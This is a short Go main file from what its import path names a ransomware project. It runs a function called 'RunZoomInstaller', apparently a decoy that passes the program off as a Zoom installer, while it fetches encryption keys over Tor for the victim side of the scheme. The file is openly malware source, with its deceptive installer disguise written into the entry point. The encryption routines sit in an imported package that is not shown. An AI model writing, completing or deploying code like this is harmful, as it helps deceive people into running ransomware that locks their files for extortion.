package main

import (
    "log"

    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
)

func main() {
    go victim.RunZoomInstaller()
    err := victim.DownloadKeysFromTor()
    if err != nil {
        log.Fatal(err)
    }
}
